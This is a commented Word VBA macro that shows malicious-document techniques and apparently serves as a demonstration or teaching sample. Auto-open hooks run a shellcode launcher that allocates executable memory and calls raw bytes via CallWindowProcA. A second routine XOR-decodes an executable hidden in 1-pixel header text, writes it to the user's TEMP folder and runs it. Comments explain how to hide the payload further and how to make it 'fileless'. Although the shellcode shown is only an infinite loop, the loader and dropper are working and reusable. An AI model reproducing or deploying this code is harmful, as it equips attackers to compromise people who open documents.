' I can't believe you can do this in Word Document VBA Macros...
' The following lines declare private functions for this macro
' that can directly call exported APIs from Windows DLLs...What in
' the ever loving f*** were people thinking when they included this
' kind of functionality in a Word Document...
Private Declare Function VirtualAlloc Lib "kernel32.dll" (ByVal addr As Long, ByVal size As Long, ByVal flags As Long, ByVal prots As Long) As Long
Private Declare Function RtlMoveMemory Lib "kernel32.dll" (ByVal dstAddr As Long, ByVal source As Any, ByVal size As Long) As Long
Private Declare Function CallWindowProcA Lib "user32.dll" (ByVal prevWndFunc As Long, ByVal hWnd As Long, ByVal msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

' Enables auto opening of macros when the document is opened.
Sub AutoOpen()
    Auto_Open
End Sub

' Enables auto opening of macros when workbooks are opened.
Sub Workbook_Open()
    Auto_Open
End Sub

' Sets the LaunchShellcode function to run when the document is opened.
Sub Auto_Open()
    LaunchShellcode()
End Sub

' Turns a string into bytes.
Function toBytes(x As String) As Byte()
    Dim tmp() As String
    Dim fx() As Byte
    Dim i As Long
    
    tmp = Split(x, " ")
    ReDim fx(UBound(tmp))
    
    For i = 0 To UBound(tmp)
        fx(i) = CInt("&h" & tmp(i))
    Next
    
    toBytes = fx()
End Function

' This will allocate memory and write a short snippet of shellcode to that location.
' It will then convert a different shellcode string into bytes and use CallWindowProcA
' to directly execute those bytes. Those bytes call into our allocated buffer and execute
' the shellcode put there...again...can't believe you can do this via intended functionality
' in a Word Document.
' P.S. You can combine this with the next technique of deobfuscating/decoding
' ASCII from the header. If you place shellcode in the header instead of an EXE (which
' gets dropped to disk) you'll be decoding pure shellcode, loading it into allocated
' memory, and then calling into it; you now have fileless malware.
Sub LaunchShellcode()
    
    Dim myMem As Long
    Dim myChar As Long
    myChar = &HFEEB& ' Hex bytes 0xEB 0xFE = assembly infinite jump
    myMem = VirtualAlloc(SYSNULL, 17408, &H1000&, &H40&) ' Allocate memory
    myMemSet = RtlMoveMemory(myMem, VarPtr(myChar), 2)   ' Move EBFE into the memory.
    
    Dim myByteString As String
    myByteString = "EB FE 8B 45 0C FF D0" ' Assembly String (infinite jmp; mov eax, [ebp + c]; call eax)
    
    Dim o() As Byte
    o() = toBytes(myByteString) ' The "o" function will now be the bytes of the converted assebly string.
    
    Dim cRet As Long
    cRet = CallWindowProcA(VarPtr(o(0)), myMem, 0, 0, 0) ' VarPtr gets the address of the "o" function and it will be called
                                                         ' Memory allocation is on the stack [ebp + c]
    
End Sub
      
' This will read obfuscated ASCII from the document header and deobfuscate
' it into bytes. It then writes the bytes to an EXE in the %TEMP% directory and
' executes it via the Hkmyg13 function. I believe part of this was taken from 
' a metasploit technique. I can't remember. I just remember modifying it to 
' deobfuscate a custom binary from the document header.
        
' The binary file is hidden in the header via 1 pixel  text. Because 
' the text is so small it doesn't render as anything until the user 
' interacts with the text document most of the time. This text can 
' be further hidden by making it white. 
' The VBA macro reads the header and decodes the ASCII 2 letters 
' at a time and decodes these into a hex byte via CLng and XORs 
' it with 4 to produce the original hex byte. 
' It then writes these bytes one at a time to an exe file in the user's 
' TEMP folder. The EXE is then launched.
' The binary it decodes has a TLS callback which checks for a debugger 
' via the PEB. If a debugger is found then it finds the address of 
' main and VirtualProtects the page to ERW. It then writes 0x01 
' to the first byte at that address and re-protects the memory with 
' the original protections. This essentially breaks the assembly 
' language at that location and causes a fault when executing. 
' If you execute the binary outside of a debugger, the TLS will call 
' a subfunction which prints "...catch this string", returns to TLS, goes 
' to main, prints "...you didn't catch the string", and then infinite loops.
Sub DeobfuscateBinary()
    Dim Hkmyg7 As Integer
    Dim Hkmyg1 As String
    Dim Hkmyg2 As String
    Dim Hkmyg3 As Byte
    Dim Hkmyg4 As Paragraph
    Dim Hkmyg8 As Double
    Dim Hkmyg88 As Byte
    Dim Hkmyg9 As Boolean
    Dim Hkmyg5 As Integer
    Dim Hkmyg11 As String
    Dim Hkmyg6 As Byte
    Dim Euilajldnk As String
    Euilajldnk = "Euilajldnk"
    Hkmyg1 = "MaqXqyxUGh.exe"
    Hkmyg2 = Environ("TEMP")
    ChDrive (Hkmyg2)
    ChDir (Hkmyg2)
    Hkmyg3 = FreeFile()
    Open Hkmyg1 For Binary As Hkmyg3
    For Each Hkmyg4 In ActiveDocument.Sections(1).Headers(1).Range.Paragraphs
        DoEvents
            Hkmyg11 = Hkmyg4.Range.Text
        If (True) Then
            Hkmyg8 = 1
            While (Hkmyg8 < Len(Hkmyg11))
                Dim myString As String
                myString = Mid(Hkmyg11, Hkmyg8, 2)
                Hkmyg88 = CLng("&h" & myString)
                Hkmyg88 = Hkmyg88 Xor 4 ' each byte is xor'd with 4
                Put #Hkmyg3, , Hkmyg88
                Hkmyg8 = Hkmyg8 + 2
            Wend
        ElseIf (InStr(1, Hkmyg11, Euilajldnk) > 0 And Len(Hkmyg11) > 0) Then
            Hkmyg9 = True
        End If
    Next
    Close #Hkmyg3
    'For x = 1 To 500000000
    '    x = x
    'Next
    
    Hkmyg13 (Hkmyg1)
End Sub

' Function to execute the EXE which was dropped to disk.
Sub Hkmyg13(Hkmyg10 As String)
    Dim Hkmyg7 As Integer
    Dim Hkmyg2 As String
    Hkmyg2 = Environ("TEMP")
    ChDrive (Hkmyg2)
    ChDir (Hkmyg2)
    Hkmyg7 = Shell(Hkmyg10, vbNormalFocus) ',vbHide)
End Sub
